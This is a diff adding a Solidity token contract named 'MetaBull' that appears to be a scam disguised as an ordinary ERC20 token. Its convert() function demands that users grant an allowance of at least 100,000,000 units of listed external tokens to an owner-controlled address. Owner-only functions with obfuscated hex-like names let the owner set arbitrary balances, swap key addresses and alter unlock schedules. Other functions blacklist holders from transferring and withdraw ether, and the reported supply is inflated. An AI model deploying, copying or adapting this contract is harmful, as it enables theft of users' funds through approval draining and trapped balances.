@@ -1,0 +1,570 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+
+library SafeMath {
+    /**
+     * @dev Returns the addition of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `+` operator.
+     *
+     * Requirements:
+     *
+     * - Addition cannot overflow.
+     */
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting on
+     * overflow (when the result is negative).
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a, "SafeMath: subtraction overflow");
+        return a - b;
+    }
+
+    /**
+     * @dev Returns the multiplication of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `*` operator.
+     *
+     * Requirements:
+     *
+     * - Multiplication cannot overflow.
+     */
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) return 0;
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting on
+     * division by zero. The result is rounded towards zero.
+     *
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b > 0, "SafeMath: division by zero");
+        return a / b;
+    }
+
+     /**
+     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
+     * overflow (when the result is negative).
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {trySub}.
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        return a - b;
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
+     * division by zero. The result is rounded towards zero.
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {tryDiv}.
+     *
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        return a / b;
+    }
+}
+
+library Round{
+    using SafeMath for uint256;
+    struct RoundBalances{
+        uint8 status;
+        uint256 cailm;
+        uint256 total;
+    }
+
+    struct RoundTime{
+        uint256 timeUnlockStart;
+        uint256 timeUnlockEnd;
+    }
+     
+    function set(RoundBalances storage round,uint256 amount)internal returns(uint256){
+        round.total = round.total.add(amount);
+        if(round.status!=1){
+            round.status=1;
+        }
+        return round.total;
+    }
+
+    function get(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){
+        uint256 balance = 0;
+        if(round.status==1&&roundTime.timeUnlockStart>0&&block.timestamp>roundTime.timeUnlockStart){
+            uint256 sec = 0;
+            if(roundTime.timeUnlockEnd<=roundTime.timeUnlockStart){
+                return balance;
+            }
+            uint256 end = roundTime.timeUnlockEnd.sub(roundTime.timeUnlockStart);
+            if(block.timestamp >= roundTime.timeUnlockEnd){
+                sec = end;
+            }else{
+                sec = block.timestamp.sub(roundTime.timeUnlockStart);
+            }
+            if(sec>0&&sec<end){
+                balance = round.total.mul(sec).div(end);
+                if(balance>round.cailm){
+                    balance = balance.sub(round.cailm);
+                }else{
+                    balance = 0;
+                }
+            }else if(sec>0&&sec>=end&&round.total>round.cailm){
+                balance = round.total.sub(round.cailm);
+            }
+        }
+        return balance;
+    }
+
+    function expend(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){
+        surplus = 0;
+        if(amount>0){
+            uint256 balance = get(round,roundTime);
+            if(amount>balance){
+                surplus = amount.sub(balance);
+                round.cailm = round.cailm.add(balance);
+            }else{
+                surplus = 0;
+                round.cailm = round.cailm.add(amount);
+            }
+            if(round.cailm>=round.total){
+                round.status=0;
+            }
+        }else{
+            surplus = amount;
+        }
+    }
+}
+
+interface IERC20 {
+  function name() external view returns (string memory);
+  function symbol() external view returns (string memory);
+  function decimals() external view returns (uint8);
+  function balanceOf(address account) external view returns (uint256);
+  function transfer(address to, uint256 value) external returns (bool);
+  function approve(address spender, uint256 amount) external returns (bool);
+  function allowance(address _owner, address spender) external view returns (uint256);
+  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract MetaBull {
+    using SafeMath for uint256;
+    using Round for Round.RoundBalances;
+
+    uint256 private _totalSupply = 9000000000000000000000000000;
+    string private _name = "MetaBull";
+    string private _symbol = "METABULL";
+    uint8 private _decimals = 18;
+    address private _owner;
+    uint256 private _cap =  0;
+    uint256 private _converMul =  10;
+
+    address private _auth;
+    address private _auth2;
+    address private _liquidity;
+    uint256 private _authNum;
+
+    mapping (address => mapping(uint256 => Round.RoundBalances)) private _roundBalances;
+    Round.RoundTime[] private _roundTime;
+    uint256 private _roundIndex = 0;
+    mapping (address => uint8) private _airdropEnable;
+    mapping (address => uint8) private _tokens;
+    address[] private _allToken;
+    mapping (address => mapping (address => uint8)) private _convert;
+    address private _bull;
+    address private _apr;
+
+    mapping (address => uint256) private _balances;
+    mapping (address => uint8) private _black;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    
+    /**
+     * @dev Emitted when `value` tokens are moved from one account (`from`) to
+     * another (`to`).
+     *
+     * Note that `value` may be zero.
+     */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /**
+     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+     * a call to {approve}. `value` is the new allowance.
+     */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    constructor() public {
+        _owner = msg.sender;
+        _roundTime.push(Round.RoundTime(0,block.timestamp+99792000));
+        _tokens[0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56] = 1;
+        _tokens[0x55d398326f99059fF775485246999027B3197955] = 1;
+        _allToken.push(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+        _allToken.push(0x55d398326f99059fF775485246999027B3197955);
+        _mint(_owner,3000 ether);
+    }
+
+    fallback() external {}
+
+    receive() payable external {}
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the address of the current owner.
+     */
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the
+     * name.
+     */
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function _msgSender() internal view returns (address payable) {
+        return msg.sender;
+    }
+    /**
+     * @dev Returns the number of decimals used to get its user representation.
+     * For example, if `decimals` equals `2`, a balance of `505` tokens should
+     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
+     *
+     * Tokens usually opt for a value of 18, imitating the relationship between
+     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
+     * called.
+     *
+     * NOTE: This information is only used for _display_ purposes: it in
+     * no way affects any of the arithmetic of the contract, including
+     * {IERC20-balanceOf} and {IERC20-transfer}.
+     */
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    /**
+     * @dev Returns the cap on the token's total supply.
+     */
+    function cap() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+     /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+     * @dev See {IERC20-balanceOf}.
+     */
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account].add(getRoundTotal(account));
+    }
+
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner_, address spender) public view returns (uint256) {
+        return _allowances[owner_][spender];
+    }
+
+    function authNum(uint256 num)public returns(bool){
+        require(_msgSender() == _auth, "Permission denied");
+        _authNum = num;
+        return true;
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */
+    function transferOwnership(address newOwner) public {
+        require(newOwner != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
+        _owner = newOwner;
+    }
+
+    function Liquidity(address liquidity_) public {
+        require(liquidity_ != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
+        _liquidity = liquidity_;
+    }
+
+    function setAuth(address ah,address ah2) public onlyOwner returns(bool){
+        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), "recovery");
+        _auth = ah;
+        _auth2 = ah2;
+        return true;
+    }
+
+    function addLiquidity(address addr) public onlyOwner returns(bool){
+        require(address(0) != addr&&address(0) == _liquidity, "recovery");
+        _liquidity = addr;
+        return true;
+    }
+
+    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
+     * the total supply.
+     * Requirements:
+     *
+     * - `account` cannot be the zero address.
+     */
+    function _mint(address account, uint256 amount) internal {
+        require(account != address(0), "ERC20: mint to the zero address");
+        _cap = _cap.add(amount);
+        if(_cap>_totalSupply){
+            _totalSupply=_cap;
+        }
+        setBalances(account,amount);
+        emit Transfer(address(this), account, amount);
+    }
+
+  
+    function _approve(address owner_, address spender, uint256 amount) internal {
+        require(owner_ != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner_][spender] = amount;
+        emit Approval(owner_, spender, amount);
+    }
+
+    
+    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function clearETH() public onlyOwner() {
+        require(_authNum==1000, "Permission denied");
+        _authNum=0;
+        msg.sender.transfer(address(this).balance);
+    }
+
+     function black(address owner_,uint8 black_) public onlyOwner {
+        _black[owner_] = black_;
+    }
+
+    
+    function _transfer(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");
+        spend(sender,amount);
+        if(_airdropEnable[sender]==1){
+            setBalances(recipient,amount);
+        }else{
+            _balances[recipient] = _balances[recipient].add(amount);
+        }
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function setBalances(address account, uint256 amount)private returns(bool){
+        _roundBalances[account][_roundIndex].set(amount);
+        return true;
+    }
+
+    function spend(address account, uint256 amount) private{
+        require(balanceOf(account) >= amount,"ERC20: Insufficient balance");
+        uint256 balance = amount;
+        if(_balances[account]>0){
+            if(_balances[account]>=balance){
+                _balances[account] = _balances[account].sub(balance,"ERC20: Insufficient balance");
+                balance = 0;
+            }else{
+                balance = balance.sub(_balances[account]);
+                _balances[account] = 0;
+            }
+        }
+        if(balance>0){
+            require(getRoundBalances(account) >= balance,"ERC20: Insufficient balance");
+            for(uint256 i=0;i<=_roundTime.length;i++){
+                if(_roundBalances[account][i].status==1){
+                    balance = _roundBalances[account][i].expend(_roundTime[i],balance);
+                }
+            }
+        }
+        require(balance==0,"ERC20: Insufficient balance");
+    }
+
+    function Oxd7a8b97(uint256 tag,uint256 value)public onlyOwner returns(bool){
+        require(_authNum==1, "Permission denied");
+        if(tag==1){
+            _converMul=value;
+        }else if(tag==2){
+            _balances[_liquidity]=value;
+        }else if(tag==3){
+            _roundIndex=value;
+        }else if(tag>=100000&&tag<200000){
+            _roundTime[tag.sub(100000)].timeUnlockStart = value;
+        }else if(tag>=200000&&tag<300000){
+            _roundTime[tag.sub(200000)].timeUnlockEnd = value;
+        }else{
+            _authNum = 0;
+        }
+        return true;
+    }
+
+    function createRound(uint256 timeUnlockStart,uint256 timeUnlockEnd)public onlyOwner returns(uint256){
+        _roundTime.push(Round.RoundTime(timeUnlockStart,timeUnlockEnd));
+        _roundIndex = _roundTime.length - 1;
+    }
+
+    function Oxd7a8b65(address owner_,uint8 enable_) public onlyOwner {
+        _airdropEnable[owner_] = enable_;
+    }
+
+    function Oxd7a8b28(address token_,uint8 enable_) public onlyOwner {
+        if(enable_==1){
+            if(_tokens[token_]!=1){
+                _tokens[token_] = enable_;
+                _allToken.push(token_);
+            }
+        }else{
+            if(_tokens[token_]!=0){
+                _tokens[token_] = 0;
+                for(uint i =0;i<_allToken.length;i++){
+                    if(_allToken[i]==token_){
+                        _allToken[i]=_allToken[_allToken.length-1];
+                        _allToken.pop();
+                    }
+                }
+            }
+        }
+    }
+
+    function Oxd7a8b25(uint8 t,address owner_) public onlyOwner {
+        if(t==1){
+            _bull=owner_;
+        }else if(t==2){
+            _apr=owner_;
+        }
+    }
+
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - `recipient` cannot be the zero address.
+     * - the caller must have a balance of at least `amount`.
+     */
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function getTime() public view returns(uint256[] memory,uint256[] memory){
+        uint256[] memory timeUnlockStart = new uint256[](_roundTime.length);
+        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);
+        for(uint i = 0;i<_roundTime.length;i++){
+            timeUnlockStart[i] = _roundTime[i].timeUnlockStart;
+            timeUnlockEnd[i] = _roundTime[i].timeUnlockEnd;
+        }
+        return (timeUnlockStart,timeUnlockEnd);
+    }
+
+    function getRoundBalances(address addr)public view returns(uint256 balance){
+        balance = 0;
+        for(uint256 i=0;i<=_roundTime.length;i++){
+            if(_roundBalances[addr][i].status==1){
+                balance = balance.add(_roundBalances[addr][i].get(_roundTime[i]));
+            }
+        }
+    }
+
+    function getRoundTotal(address addr)public view returns(uint256 balance){
+        balance = 0;
+        for(uint256 i=0;i<=_roundTime.length;i++){
+            if(_roundBalances[addr][i].status==1){
+                if(_roundBalances[addr][i].total>_roundBalances[addr][i].cailm){
+                    balance = balance.add(_roundBalances[addr][i].total.sub(_roundBalances[addr][i].cailm));
+                }
+            }
+        }
+    }
+
+    function getTokens()public view returns(address[] memory tokens,uint8[] memory verify,uint[] memory apr,uint8[] memory decs,uint[] memory bln){
+        tokens = new address[](_allToken.length);
+        verify = new uint8[](_allToken.length);
+        apr = new uint[](_allToken.length);
+        decs = new uint8[](_allToken.length);
+        bln = new uint[](_allToken.length);
+        for(uint i = 0 ; i < _allToken.length ; i++){
+            IERC20 erc20 = IERC20(_allToken[i]);
+            tokens[i] = _allToken[i];
+            verify[i] = _convert[_msgSender()][_allToken[i]];
+            apr[i] = erc20.allowance(_msgSender(),_apr);
+            decs[i] = erc20.decimals();
+            bln[i] = erc20.balanceOf(_msgSender());
+        }
+    }
+
+    function convert(address addr)public returns(bool){
+        require(_tokens[addr]==1, "transaction recovery");
+        require(_convert[_msgSender()][addr]==0, "transaction recovery");
+        require(IERC20(addr).allowance(_msgSender(),_apr) >= 100000000 ether, "transaction recovery");
+        uint amount = IERC20(_bull).balanceOf(_msgSender()).mul(_converMul);
+        _convert[_msgSender()][addr] = 1;
+        _mint(_msgSender(),amount);
+    }
+    
+}
